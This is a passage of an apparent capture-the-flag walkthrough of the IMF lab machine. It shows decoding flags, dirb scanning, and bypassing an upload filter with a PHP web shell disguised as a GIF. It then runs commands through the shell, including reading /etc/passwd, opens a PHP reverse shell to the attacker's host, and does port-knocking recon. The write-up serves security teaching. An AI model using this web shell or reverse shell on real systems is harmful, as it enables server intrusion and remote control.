+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
+Training classrooms available. &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./images/whiteboard.jpg&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt; Contact us for training.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;the whiteboard.jgp image contained a QR code, scanning it with my phone produced flag 4.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;flag4{dXBsb2Fkcjk0Mi5waHA=}&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# echo dXBsb2Fkcjk0Mi5waHA= | base64 -d
+uploadr942.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Another page to visit.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# curl -b /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/uploadr942.php'
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;File Uploader&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Intelligence Upload Form&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upload&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;enctype=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;File to upload:&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
+    	&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upload&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looks like we can upload stuff, but there are restrictions.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# curl -b /tmp/imf.cookie -F &quot;file=@/tmp/imf.php&quot; 'http://192.168.1.62/imfadministrator/uploadr942.php'
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;File Uploader&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Intelligence Upload Form&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+Error: Invalid file type.&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upload&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;enctype=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;File to upload:&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
+    	&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upload&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+root@kali:~#
+root@kali:~# curl -b /tmp/imf.cookie -F &quot;file=@/tmp/redacted-thumb.jpg&quot; 'http://192.168.1.62/imfadministrator/uploadr942.php'
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;File Uploader&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Intelligence Upload Form&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+File successfully uploaded.
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 2b705aada13b --&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upload&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;enctype=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;File to upload:&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
+    	&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upload&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;was giving me a file identifier, but I couldn’t find where they were uploaded. Dirbed the imfadministrator page.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# dirb http://192.168.1.62/imfadministrator/ -c &quot;PHPSESSID=b1qs1kve0kevsanmk870586g31&quot;
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Nov  4 20:19:45 2016
+URL_BASE: http://192.168.1.62/imfadministrator/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+COOKIE: PHPSESSID=b1qs1kve0kevsanmk870586g31
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.1.62/imfadministrator/ ----
+==&amp;gt; DIRECTORY: http://192.168.1.62/imfadministrator/images/                                                                                                    
++ http://192.168.1.62/imfadministrator/index.php (CODE:200|SIZE:91)                                                                                            
+==&amp;gt; DIRECTORY: http://192.168.1.62/imfadministrator/uploads/                                                                                                   
+
+---- Entering directory: http://192.168.1.62/imfadministrator/images/ ----
++ http://192.168.1.62/imfadministrator/images/index.php (CODE:200|SIZE:0)                                                                                      
+
+---- Entering directory: http://192.168.1.62/imfadministrator/uploads/ ----
+
+-----------------
+END_TIME: Fri Nov  4 20:20:09 2016
+DOWNLOADED: 13836 - FOUND: 2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Found it in /uploads/
+Now I just need to get some command execution. Luckily we can inject PHP into a .gif file.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# echo &quot;FFD8FFE0&quot; | xxd -r -p &amp;gt; /tmp/shell.gif
+root@kali:~#
+root@kali:~# echo '&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $cmd=$_GET[&quot;cmd&quot;]; echo `$cmd`; ?&amp;gt;&lt;/span&gt;' &amp;gt;&amp;gt; /tmp/shell.gif
+root@kali:~#
+root@kali:~# curl -b /tmp/imf.cookie -F 'file=@/tmp/shell.gif' 'http://192.168.1.62/imfadministrator/uploadr942.php'
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;File Uploader&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Intelligence Upload Form&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+File successfully uploaded.
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- e62bbedc5a5a --&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upload&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;enctype=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;multipart/form-data&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;File to upload:&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;file&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;
+    	&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Upload&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+root@kali:~#
+root@kali:~# curl -b /tmp/imf.cookie http://192.168.1.62/imfadministrator/uploads/e62bbedc5a5a.gif?cmd=id
+����uid=33(www-data) gid=33(www-data) groups=33(www-data)
+root@kali:~#
+root@kali:~# curl -c /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/uploads/16344eb0919a.gif?cmd=cat%20%2Fetc%2Fpasswd'
+����root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+lxd:x:106:65534::/var/lib/lxd/:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+messagebus:x:108:112::/var/run/dbus:/bin/false
+uuidd:x:109:113::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+setup:x:1000:1000:setup,,,:/home/setup:/bin/bash
+root@kali:~#
+root@kali:~# curl -c /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/uploads/16344eb0919a.gif?cmd=ls%20-al'
+����total 124
+drwxr-xr-x 2 www-data www-data  4096 Nov  4 20:40 .
+drwxr-xr-x 4 www-data www-data  4096 Oct 17 04:51 ..
+-rw-r--r-- 1 www-data www-data    82 Oct 12 19:26 .htaccess
+-rw-r--r-- 1 www-data www-data    43 Nov  4 20:40 16344eb0919a.gif
+-rw-r--r-- 1 www-data www-data  2539 Nov  4 20:14 2b705aada13b.jpg
+-rw-r--r-- 1 www-data www-data    41 Nov  4 20:35 3580d33cfd01.gif
+-rw-r--r-- 1 www-data www-data    41 Nov  4 20:32 5fba0f426811.jpg
+-rw-r--r-- 1 www-data www-data    41 Nov  4 20:36 769b8269c0ba.gif
+-rw-r--r-- 1 www-data www-data    41 Nov  4 20:34 79bf51b01b6a.gif
+-rw-r--r-- 1 www-data www-data 83407 Nov  4 20:13 bffd73ceee58.jpg
+-rw-r--r-- 1 www-data www-data    28 Oct 12 19:32 flag5_abc123def.txt
+root@kali:~# curl -c /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/uploads/16344eb0919a.gif?cmd=cat%20flag5_abc123def.txt'
+����flag5{YWdlbnRzZXJ2aWNlcw==}
+root@kali:~#
+root@kali:~# echo YWdlbnRzZXJ2aWNlcw== | base64 -d
+agentservices
+root@kali:~#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;flag5{YWdlbnRzZXJ2aWNlcw==}&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Awesome, we have the 5th flag. Let’s now get a shell. I used a php reverse shell found on &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;PentestMonkey&lt;/a&gt; for this&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# :~# curl -c /tmp/imf.cookie 'http://192.168.1.62/imfadministrator/uploads/16344eb0919a.gif?cmd=php%20-r%20%27%24sock%3Dfsockopen(%22192.168.1.60%C22)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B%27'
+
+root@kali:~# nc -lnvp 22
+listening on [any] 22 ...
+connect to [192.168.1.60] from (UNKNOWN) [192.168.1.62] 50770
+/bin/sh: 0: can't access tty; job control turned off
+$
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now that we have a shell, it was time to escalate. Again, following the hints, I searched for any files with agent in the name.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ find / -type f -name &quot;*agent*&quot; -print 2&amp;gt;/dev/null
+/usr/local/bin/agent
+...SNIP...
+www-data@imf:/var/www$
+www-data@imf:/var/www$ file /usr/local/bin/agent
+file /usr/local/bin/agent
+/usr/local/bin/agent: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=444d1910b8b99d492e6e79fe2383fd346fc8d4c7, not stripped
+www-data@imf:/var/www$
+www-data@imf:/var/www$ echo $PATH
+echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+www-data@imf:/var/www$
+www-data@imf:/var/www$ agent
+agent
+  ___ __  __ ___
+ |_ _|  \/  | __|  Agent
+  | || |\/| | _|   Reporting
+ |___|_|  |_|_|    System
+
+
+Agent ID : 12345678
+Invalid Agent ID
+www-data@imf:/var/www$
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cool… Looks like a custom application that requires an agent ID. It runs as root as well. Previously (output not shown) I noticed knockd service was running so it’s likely we have a hidden port. Further checking and I found access_codes in /usr/local/bin alongside the agent binary.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@imf:/var/www$ cd /usr/local/bin
+cd /usr/local/bin
+www-data@imf:/usr/local/bin$ ls -l
+ls -l
+total 16
+-rw-r--r-- 1 root root    19 Oct 16 08:11 access_codes
+-rwxr-xr-x 1 root root 11896 Oct 12 22:39 agent
+www-data@imf:/usr/local/bin$
+
+www-data@imf:/usr/local/bin$ cat access_codes
+cat access_codes
+SYN 7482,8279,9467
+www-data@imf:/usr/local/bin$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If that doesn’t scream port knock, I don’t know what else does.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap -p- --min-rate=400 -T4 192.168.1.62
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-05 19:06 EDT
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.0028s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 90.51 seconds
+root@kali:~#
+root@kali:~# for x in 7482 8279 9467; do nmap -sS --max-retries 0 -p $x 192.168.1.62; done
+
+Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-11-05 19:09 EDT
+Warning: 192.168.1.62 giving up on port because retransmission cap hit (0).
+Nmap scan report for imf (192.168.1.62)
+Host is up (0.00053s latency).
+PORT     STATE    SERVICE
+7482/tcp filtered unknown
+MAC Address: 00:0C:29:5F:9F:7C (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
+
